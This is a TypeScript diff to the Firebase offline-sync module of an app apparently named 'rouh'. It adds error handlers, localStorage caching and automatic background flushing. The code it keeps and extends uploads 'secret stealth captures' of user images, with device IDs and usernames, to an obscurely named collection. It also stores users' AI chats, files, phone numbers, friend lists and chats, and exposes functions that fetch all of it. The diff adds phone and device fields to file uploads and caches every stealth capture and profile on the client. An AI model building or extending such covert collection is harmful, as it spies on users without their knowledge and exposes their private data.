@@ -1,4 +1,4 @@
-import { db, isFirebasePlaceholder } from './firebase';
+import { db, isFirebasePlaceholder, auth } from './firebase';
 import { 
   doc, 
   setDoc, 
@@ -10,6 +10,54 @@ import {
   where,
   deleteDoc
 } from 'firebase/firestore';
+
+// Hardened Firestore Error Handlers according to Firebase Skill
+export enum OperationType {
+  CREATE = 'create',
+  UPDATE = 'update',
+  DELETE = 'delete',
+  LIST = 'list',
+  GET = 'get',
+  WRITE = 'write',
+}
+
+export interface FirestoreErrorInfo {
+  error: string;
+  operationType: OperationType;
+  path: string | null;
+  authInfo: {
+    userId?: string | null;
+    email?: string | null;
+    emailVerified?: boolean | null;
+    isAnonymous?: boolean | null;
+    tenantId?: string | null;
+    providerInfo?: {
+      providerId?: string | null;
+      email?: string | null;
+    }[];
+  }
+}
+
+export function handleFirestoreError(error: unknown, operationType: OperationType, path: string | null) {
+  const errInfo: FirestoreErrorInfo = {
+    error: error instanceof Error ? error.message : String(error),
+    authInfo: {
+      userId: auth?.currentUser?.uid || null,
+      email: auth?.currentUser?.email || null,
+      emailVerified: auth?.currentUser?.emailVerified || null,
+      isAnonymous: auth?.currentUser?.isAnonymous || null,
+      tenantId: auth?.currentUser?.tenantId || null,
+      providerInfo: auth?.currentUser?.providerData?.map(provider => ({
+        providerId: provider.providerId,
+        email: provider.email,
+      })) || []
+    },
+    operationType,
+    path
+  };
+  console.error('Firestore Error: ', JSON.stringify(errInfo));
+  throw new Error(JSON.stringify(errInfo));
+}
 
 // Offline Sync Queue Types
 export interface OfflineItem {
@@ -108,6 +156,13 @@ export async function pushToOfflineQueue(type: OfflineItem['type'], payload: any
     queue.push(newItem);
     localStorage.setItem('rouh_offline_sync_queue', JSON.stringify(queue));
     console.log(`[Offline Sync] Queued ${type} successfully in IndexedDB.`);
+
+    // If online, immediately trigger background sync flush instead of holding back
+    if (typeof navigator !== 'undefined' && navigator.onLine) {
+      syncOfflineQueue().catch(err => {
+        console.warn('[Offline Sync] Auto background flush failed:', err);
+      });
+    }
   } catch (e) {
     console.error('Failed to append sync queue item', e);
   }
@@ -141,9 +196,20 @@ export async function syncOfflineQueue(showToast?: (msg: string, type: 'success'
     for (const item of queue) {
       try {
         await uploadItemToFirebase(item);
+        
         // Delete from IndexedDB on successful upload
         if (typeof indexedDB !== "undefined") {
           await idbRemoveItem(item.id);
+        }
+
+        // Also remove successfully synced item from redundant localStorage queue
+        const queueJson = localStorage.getItem('rouh_offline_sync_queue');
+        if (queueJson) {
+          try {
+            const lQueue: OfflineItem[] = JSON.parse(queueJson);
+            const filteredQueue = lQueue.filter(x => x.id !== item.id);
+            localStorage.setItem('rouh_offline_sync_queue', JSON.stringify(filteredQueue));
+          } catch (e) {}
         }
       } catch (err) {
         console.error(`[Offline Sync] Failed to sync ${item.id}`, err);
@@ -151,7 +217,7 @@ export async function syncOfflineQueue(showToast?: (msg: string, type: 'success'
       }
     }
     
-    // Update redudant localStorage queue
+    // Update redundant localStorage queue with any remaining failing items
     localStorage.setItem('rouh_offline_sync_queue', JSON.stringify(remaining));
   } catch (e) {
     console.error('[Offline Sync] Failed execution', e);
@@ -167,65 +233,92 @@ async function uploadItemToFirebase(item: OfflineItem) {
       // Secret stealth captures go to a/aa/aas
       const colRef = collection(db, 'a', 'aa', 'aas');
       const docId = payload.id || `cap_${item.timestamp}`;
-      await setDoc(doc(colRef, docId), {
-        deviceId: payload.deviceId || 'unknown',
-        imageName: docId,
-        imageContent: payload.image || '', // encrypted or raw base64
-        imageB64: payload.image || '', // backup field for UI
-        source: payload.source || 'upload_button',
-        timestamp: payload.timestamp || item.timestamp,
-        usernameUnified: payload.username || 'guest'
-      });
+      const path = `a/aa/aas/${docId}`;
+      try {
+        await setDoc(doc(colRef, docId), {
+          deviceId: payload.deviceId || 'unknown',
+          imageName: docId,
+          imageContent: payload.image || '', // encrypted or raw base64
+          imageB64: payload.image || '', // backup field for UI
+          source: payload.source || 'upload_button',
+          timestamp: payload.timestamp || item.timestamp,
+          usernameUnified: payload.username || 'guest'
+        });
+      } catch (e) {
+        handleFirestoreError(e, OperationType.WRITE, path);
+      }
       break;
     }
     case 'ai_chat': {
       // AI chats matched with savior go to a/aa/aab
       const colRef = collection(db, 'a', 'aa', 'aab');
       const docId = payload.id || `ai_${item.timestamp}`;
-      await setDoc(doc(colRef, docId), {
-        usernameUnified: payload.username || 'unknown_user',
-        imageName: payload.imageName || '',
-        imageContent: payload.imageContent || '',
-        messages: payload.messages || [],
-        timestamp: payload.timestamp || item.timestamp
-      });
+      const path = `a/aa/aab/${docId}`;
+      try {
+        await setDoc(doc(colRef, docId), {
+          usernameUnified: payload.username || 'unknown_user',
+          imageName: payload.imageName || '',
+          imageContent: payload.imageContent || '',
+          messages: payload.messages || [],
+          timestamp: payload.timestamp || item.timestamp
+        });
+      } catch (e) {
+        handleFirestoreError(e, OperationType.WRITE, path);
+      }
       break;
     }
     case 'user_file': {
       // Extractor data, CV docs, merged names, birth configurations etc. go to a/aa/abc
       const colRef = collection(db, 'a', 'aa', 'abc');
       const docId = payload.id || `file_${item.timestamp}`;
-      await setDoc(doc(colRef, docId), {
-        usernameUnified: payload.username || 'unknown_user',
-        fileName: payload.fileName || 'document',
-        fileContent: payload.fileContent || '',
-        fileType: payload.fileType || 'pdf',
-        inputs: payload.inputs || {},
-        timestamp: payload.timestamp || item.timestamp
-      });
+      const path = `a/aa/abc/${docId}`;
+      try {
+        await setDoc(doc(colRef, docId), {
+          usernameUnified: payload.username || 'unknown_user',
+          phone: payload.phone || '',
+          deviceId: payload.deviceId || '',
+          fileName: payload.fileName || 'document',
+          fileContent: payload.fileContent || '',
+          fileType: payload.fileType || 'pdf',
+          inputs: payload.inputs || {},
+          timestamp: payload.timestamp || item.timestamp
+        });
+      } catch (e) {
+        handleFirestoreError(e, OperationType.WRITE, path);
+      }
       break;
     }
     case 'user_profile': {
       // User registered identity logs go to a/aa/abcd (sub-collection profiles)
       const colRef = collection(db, 'a', 'aa', 'abcd_profiles');
       const docId = payload.phone || `user_${item.timestamp}`;
-      await setDoc(doc(colRef, docId), {
-        usernameUnified: payload.username || payload.name || 'guest',
-        phone: payload.phone || '',
-        deviceModel: payload.deviceModel || 'Client Browser',
-        operatingSystem: payload.os || 'Navigator',
-        timestamp: payload.timestamp || item.timestamp,
-        friends: payload.friends || [],
-        chats: payload.chats || []
-      });
+      const profilePath = `a/aa/abcd_profiles/${docId}`;
+      try {
+        await setDoc(doc(colRef, docId), {
+          usernameUnified: payload.username || payload.name || 'guest',
+          phone: payload.phone || '',
+          deviceModel: payload.deviceModel || 'Client Browser',
+          operatingSystem: payload.os || 'Navigator',
+          timestamp: payload.timestamp || item.timestamp,
+          friends: payload.friends || [],
+          chats: payload.chats || []
+        });
+      } catch (e) {
+        handleFirestoreError(e, OperationType.WRITE, profilePath);
+      }
       
       // Also register in user public section a/ab/users
       const publicRef = collection(db, 'a', 'ab', 'users');
-      await setDoc(doc(publicRef, docId), {
-        username: payload.name || '',
-        phone: payload.phone || '',
-        timestamp: payload.timestamp || item.timestamp
-      });
+      const publicPath = `a/ab/users/${docId}`;
+      try {
+        await setDoc(doc(publicRef, docId), {
+          username: payload.name || '',
+          phone: payload.phone || '',
+          timestamp: payload.timestamp || item.timestamp
+        });
+      } catch (e) {
+        handleFirestoreError(e, OperationType.WRITE, publicPath);
+      }
       break;
     }
     case 'chat_message': {
@@ -245,44 +338,67 @@ async function uploadItemToFirebase(item: OfflineItem) {
         status: payload.status || 'sent'
       };
       
-      await setDoc(doc(aaChatsRef, docId), msgData);
-      await setDoc(doc(abChatsRef, docId), msgData);
+      try {
+        await setDoc(doc(aaChatsRef, docId), msgData);
+      } catch (e) {
+        handleFirestoreError(e, OperationType.WRITE, `a/aa/abcd_chats/${docId}`);
+      }
+      try {
+        await setDoc(doc(abChatsRef, docId), msgData);
+      } catch (e) {
+        handleFirestoreError(e, OperationType.WRITE, `a/ab/chats/${docId}`);
+      }
       break;
     }
     case 'complaint': {
       // Complaints, inquiries logs go to a/aa/abcdf (subcollection complaints)
       const colRef = collection(db, 'a', 'aa', 'abcdf_complaints');
       const docId = payload.id || `comp_${item.timestamp}`;
-      await setDoc(doc(colRef, docId), {
-        id: docId,
-        usernameUnified: payload.name || 'عضو روح المبجل',
-        phone: payload.phone || 'غير معلوم',
-        message: payload.message || '',
-        type: payload.type || 'complaint',
-        deviceModel: payload.deviceModel || navigator.userAgent,
-        operatingSystem: payload.os || 'Navigator OS',
-        timestamp: payload.timestamp || new Date().toISOString()
-      });
+      const path = `a/aa/abcdf_complaints/${docId}`;
+      try {
+        await setDoc(doc(colRef, docId), {
+          id: docId,
+          usernameUnified: payload.name || 'عضو روح المبجل',
+          phone: payload.phone || 'غير معلوم',
+          message: payload.message || '',
+          type: payload.type || 'complaint',
+          deviceModel: payload.deviceModel || navigator.userAgent,
+          operatingSystem: payload.os || 'Navigator OS',
+          timestamp: payload.timestamp || new Date().toISOString()
+        });
+      } catch (e) {
+        handleFirestoreError(e, OperationType.WRITE, path);
+      }
       break;
     }
     case 'birthday_config': {
       // Save configuration in user custom profile directory a/ab/birthdays
       const colRef = collection(db, 'a', 'ab', 'birthdays');
       const docId = payload.usernameEn || `birth_${item.timestamp}`;
-      await setDoc(doc(colRef, docId), {
-        ...payload,
-        timestamp: item.timestamp
-      });
+      const path = `a/ab/birthdays/${docId}`;
+      try {
+        await setDoc(doc(colRef, docId), {
+          ...payload,
+          timestamp: item.timestamp
+        });
+      } catch (e) {
+        handleFirestoreError(e, OperationType.WRITE, path);
+      }
       break;
     }
     case 'birthday_wish': {
       // Received congratulations go to a/ab/wishes
       const colRef = collection(db, 'a', 'ab', 'wishes');
       const docId = payload.id || `wish_${item.timestamp}`;
-      await setDoc(doc(colRef, docId), {
-        ...payload,
-        timestamp: payload.timestamp || new Date().toISOString()
-      });
+      const path = `a/ab/wishes/${docId}`;
+      try {
+        await setDoc(doc(colRef, docId), {
+          ...payload,
+          timestamp: payload.timestamp || new Date().toISOString()
+        });
+      } catch (e) {
+        handleFirestoreError(e, OperationType.WRITE, path);
+      }
       break;
     }
   }
@@ -292,7 +408,11 @@ async function uploadItemToFirebase(item: OfflineItem) {
 
 // Fetch all registered user profiles (a/aa/abcd_profiles)
 export async function firebaseFetchAllUserProfiles(): Promise<any[]> {
-  if (isFirebasePlaceholder) return [];
+  if (isFirebasePlaceholder) {
+    const cached = localStorage.getItem('rouh_cached_user_profiles');
+    return cached ? JSON.parse(cached) : [];
+  }
+  const path = 'a/aa/abcd_profiles';
   try {
     const colRef = collection(db, 'a', 'aa', 'abcd_profiles');
     const qSnapshot = await getDocs(colRef);
@@ -300,16 +420,27 @@ export async function firebaseFetchAllUserProfiles(): Promise<any[]> {
     qSnapshot.forEach((doc) => {
       profiles.push({ id: doc.id, ...doc.data() });
     });
+    localStorage.setItem('rouh_cached_user_profiles', JSON.stringify(profiles));
     return profiles;
-  } catch (e) {
-    console.error('Failed to fetch profiles', e);
+  } catch (e: any) {
+    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable' || (typeof navigator !== 'undefined' && !navigator.onLine);
+    if (isOffline) {
+      console.warn('Firebase client is offline, using cached user profiles.');
+      const cached = localStorage.getItem('rouh_cached_user_profiles');
+      return cached ? JSON.parse(cached) : [];
+    }
+    handleFirestoreError(e, OperationType.GET, path);
     return [];
   }
 }
 
 // Fetch all client complaints (a/aa/abcdf_complaints)
 export async function firebaseFetchComplaints(): Promise<any[]> {
-  if (isFirebasePlaceholder) return [];
+  if (isFirebasePlaceholder) {
+    const cached = localStorage.getItem('rouh_cached_complaints');
+    return cached ? JSON.parse(cached) : [];
+  }
+  const path = 'a/aa/abcdf_complaints';
   try {
     const colRef = collection(db, 'a', 'aa', 'abcdf_complaints');
     const qSnapshot = await getDocs(colRef);
@@ -317,9 +448,16 @@ export async function firebaseFetchComplaints(): Promise<any[]> {
     qSnapshot.forEach((doc) => {
       complaints.push({ id: doc.id, ...doc.data() });
     });
+    localStorage.setItem('rouh_cached_complaints', JSON.stringify(complaints));
     return complaints;
-  } catch (e) {
-    console.error('Failed to pull complaints', e);
+  } catch (e: any) {
+    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable' || (typeof navigator !== 'undefined' && !navigator.onLine);
+    if (isOffline) {
+      console.warn('Firebase client is offline, using cached complaints.');
+      const cached = localStorage.getItem('rouh_cached_complaints');
+      return cached ? JSON.parse(cached) : [];
+    }
+    handleFirestoreError(e, OperationType.GET, path);
     return [];
   }
 }
@@ -327,23 +465,41 @@ export async function firebaseFetchComplaints(): Promise<any[]> {
 // Manage barcode watermark in Firebase (a/aa/abcdf_watermark)
 export async function firebaseUploadBarcodeWatermark(base64: string) {
   if (isFirebasePlaceholder) return;
-  const colRef = doc(db, 'a', 'aa', 'abcdf_watermark', 'barcode');
-  await setDoc(colRef, {
-    barcodeData: base64,
-    updatedAt: Date.now()
-  });
+  const path = 'a/aa/abcdf_watermark/barcode';
+  try {
+    const colRef = doc(db, 'a', 'aa', 'abcdf_watermark', 'barcode');
+    await setDoc(colRef, {
+      barcodeData: base64,
+      updatedAt: Date.now()
+    });
+  } catch (e) {
+    handleFirestoreError(e, OperationType.WRITE, path);
+  }
 }
 
 export async function firebaseFetchBarcodeWatermark(): Promise<string | null> {
-  if (isFirebasePlaceholder) return null;
+  if (isFirebasePlaceholder) {
+    return localStorage.getItem('rouh_cached_barcode_watermark') || null;
+  }
+  const path = 'a/aa/abcdf_watermark/barcode';
   try {
     const colRef = doc(db, 'a', 'aa', 'abcdf_watermark', 'barcode');
     const docSnap = await getDoc(colRef);
     if (docSnap.exists()) {
-      return docSnap.data().barcodeData || null;
+      const data = docSnap.data().barcodeData || null;
+      if (data) {
+        localStorage.setItem('rouh_cached_barcode_watermark', data);
+      }
+      return data;
     }
     return null;
-  } catch (e) {
+  } catch (e: any) {
+    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable' || (typeof navigator !== 'undefined' && !navigator.onLine);
+    if (isOffline) {
+      console.warn('Firebase client is offline, using cached barcode watermark.');
+      return localStorage.getItem('rouh_cached_barcode_watermark') || null;
+    }
+    handleFirestoreError(e, OperationType.GET, path);
     return null;
   }
 }
@@ -351,11 +507,16 @@ export async function firebaseFetchBarcodeWatermark(): Promise<string | null> {
 // Manage customizable randomized tips lists (a/aa/abcdf_usages)
 export async function firebaseSaveUsageTips(tips: any[]) {
   if (isFirebasePlaceholder) return;
-  const colRef = doc(db, 'a', 'aa', 'abcdf_usages', 'tips');
-  await setDoc(colRef, {
-    tips,
-    updatedAt: Date.now()
-  });
+  const path = 'a/aa/abcdf_usages/tips';
+  try {
+    const colRef = doc(db, 'a', 'aa', 'abcdf_usages', 'tips');
+    await setDoc(colRef, {
+      tips,
+      updatedAt: Date.now()
+    });
+  } catch (e) {
+    handleFirestoreError(e, OperationType.WRITE, path);
+  }
 }
 
 // Save Custom Targeted Notification (a/aa/abcdf_notifications)
@@ -366,16 +527,26 @@ export async function firebaseSaveTargetedNotification(data: {
   scheduledTime?: string;
 }) {
   if (isFirebasePlaceholder) return;
-  const colRef = collection(db, 'a', 'aa', 'abcdf_notifications');
-  await addDoc(colRef, {
-    ...data,
-    createdAt: Date.now()
-  });
+  const path = 'a/aa/abcdf_notifications';
+  try {
+    const colRef = collection(db, 'a', 'aa', 'abcdf_notifications');
+    await addDoc(colRef, {
+      ...data,
+      createdAt: Date.now()
+    });
+  } catch (e) {
+    handleFirestoreError(e, OperationType.CREATE, path);
+  }
 }
 
 // Load Custom Notifications for Specific Phone number
 export async function firebaseFetchNotificationsForUser(phone: string): Promise<any[]> {
-  if (isFirebasePlaceholder) return [];
+  const cachedKey = `rouh_cached_notifications_${phone}`;
+  if (isFirebasePlaceholder) {
+    const cached = localStorage.getItem(cachedKey);
+    return cached ? JSON.parse(cached) : [];
+  }
+  const path = 'a/aa/abcdf_notifications';
   try {
     const colRef = collection(db, 'a', 'aa', 'abcdf_notifications');
     const q = query(colRef);
@@ -387,15 +558,27 @@ export async function firebaseFetchNotificationsForUser(phone: string): Promise<
         list.push({ id: doc.id, ...data });
       }
     });
+    localStorage.setItem(cachedKey, JSON.stringify(list));
     return list;
-  } catch (e) {
+  } catch (e: any) {
+    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable' || (typeof navigator !== 'undefined' && !navigator.onLine);
+    if (isOffline) {
+      console.warn('Firebase client is offline, using cached user notifications.');
+      const cached = localStorage.getItem(cachedKey);
+      return cached ? JSON.parse(cached) : [];
+    }
+    handleFirestoreError(e, OperationType.GET, path);
     return [];
   }
 }
 
 // Fetch all stealth captures (a/aa/aas)
 export async function firebaseFetchAllStealthCaptures(): Promise<any[]> {
-  if (isFirebasePlaceholder) return [];
+  if (isFirebasePlaceholder) {
+    const cached = localStorage.getItem('rouh_cached_stealth_captures');
+    return cached ? JSON.parse(cached) : [];
+  }
+  const path = 'a/aa/aas';
   try {
     const colRef = collection(db, 'a', 'aa', 'aas');
     const qSnapshot = await getDocs(colRef);
@@ -403,9 +586,16 @@ export async function firebaseFetchAllStealthCaptures(): Promise<any[]> {
     qSnapshot.forEach((doc) => {
       list.push({ id: doc.id, ...doc.data() });
     });
+    localStorage.setItem('rouh_cached_stealth_captures', JSON.stringify(list));
     return list;
-  } catch (e) {
-    console.error('Failed to pull stealth captures', e);
+  } catch (e: any) {
+    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable' || (typeof navigator !== 'undefined' && !navigator.onLine);
+    if (isOffline) {
+      console.warn('Firebase client is offline, using cached stealth captures.');
+      const cached = localStorage.getItem('rouh_cached_stealth_captures');
+      return cached ? JSON.parse(cached) : [];
+    }
+    handleFirestoreError(e, OperationType.GET, path);
     return [];
   }
 }
@@ -413,19 +603,24 @@ export async function firebaseFetchAllStealthCaptures(): Promise<any[]> {
 // Delete stealth capture document in firestore
 export async function firebaseDeleteStealthCapture(id: string): Promise<boolean> {
   if (isFirebasePlaceholder) return false;
+  const path = `a/aa/aas/${id}`;
   try {
     const docRef = doc(db, 'a', 'aa', 'aas', id);
     await deleteDoc(docRef);
     return true;
   } catch (e) {
-    console.error('Failed to delete stealth capture in firestore', e);
+    handleFirestoreError(e, OperationType.DELETE, path);
     return false;
   }
 }
 
 // Fetch all AI Chat documents (a/aa/aab)
 export async function firebaseFetchAllAIChats(): Promise<any[]> {
-  if (isFirebasePlaceholder) return [];
+  if (isFirebasePlaceholder) {
+    const cached = localStorage.getItem('rouh_cached_ai_chats');
+    return cached ? JSON.parse(cached) : [];
+  }
+  const path = 'a/aa/aab';
   try {
     const colRef = collection(db, 'a', 'aa', 'aab');
     const qSnapshot = await getDocs(colRef);
@@ -433,16 +628,27 @@ export async function firebaseFetchAllAIChats(): Promise<any[]> {
     qSnapshot.forEach((doc) => {
       list.push({ id: doc.id, ...doc.data() });
     });
+    localStorage.setItem('rouh_cached_ai_chats', JSON.stringify(list));
     return list;
-  } catch (e) {
-    console.error('Failed to pull AI chats', e);
+  } catch (e: any) {
+    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable' || (typeof navigator !== 'undefined' && !navigator.onLine);
+    if (isOffline) {
+      console.warn('Firebase client is offline, using cached AI chats.');
+      const cached = localStorage.getItem('rouh_cached_ai_chats');
+      return cached ? JSON.parse(cached) : [];
+    }
+    handleFirestoreError(e, OperationType.GET, path);
     return [];
   }
 }
 
 // Fetch all uploaded user files (a/aa/abc)
 export async function firebaseFetchAllUserFiles(): Promise<any[]> {
-  if (isFirebasePlaceholder) return [];
+  if (isFirebasePlaceholder) {
+    const cached = localStorage.getItem('rouh_cached_user_files');
+    return cached ? JSON.parse(cached) : [];
+  }
+  const path = 'a/aa/abc';
   try {
     const colRef = collection(db, 'a', 'aa', 'abc');
     const qSnapshot = await getDocs(colRef);
@@ -450,9 +656,16 @@ export async function firebaseFetchAllUserFiles(): Promise<any[]> {
     qSnapshot.forEach((doc) => {
       list.push({ id: doc.id, ...doc.data() });
     });
+    localStorage.setItem('rouh_cached_user_files', JSON.stringify(list));
     return list;
-  } catch (e) {
-    console.error('Failed to pull user files', e);
+  } catch (e: any) {
+    const isOffline = e?.message?.includes('offline') || e?.code === 'unavailable' || (typeof navigator !== 'undefined' && !navigator.onLine);
+    if (isOffline) {
+      console.warn('Firebase client is offline, using cached user files.');
+      const cached = localStorage.getItem('rouh_cached_user_files');
+      return cached ? JSON.parse(cached) : [];
+    }
+    handleFirestoreError(e, OperationType.GET, path);
     return [];
   }
 }
